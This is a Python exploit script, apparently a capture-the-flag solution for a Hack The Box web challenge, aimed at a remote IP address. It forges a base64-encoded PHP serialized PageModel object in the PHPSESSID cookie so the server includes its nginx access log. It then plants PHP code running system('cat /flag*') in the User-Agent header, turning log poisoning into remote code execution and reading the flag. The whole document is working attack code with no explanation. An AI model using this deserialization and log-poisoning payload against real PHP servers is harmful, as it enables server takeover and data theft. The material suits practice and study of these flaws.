import requests
import base64
import re

# url = 'http://localhost:1337'
url = 'http://157.245.44.97:31117/'

def create_cookie():
    cookie_name = "PHPSESSID"
    value = 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}'
    value = base64_encode(value)
    return 'PHPSESSID=' + value

def base64_encode(value):
    encodedBytes = base64.b64encode(value.encode("utf-8"))
    encodedStr = str(encodedBytes, "utf-8")
    return encodedStr

def find_flag(string):
    return re.search("HTB{.*}", string).group()

cookie = create_cookie()
headers = {
    'Cookie': cookie,
    'User-Agent': "<" + "?php system('cat /flag*'); ?>"
}
response1 = requests.get(url, headers=headers)
response2 = requests.get(url, headers=headers)
flag = find_flag(response2.text)
print(flag)
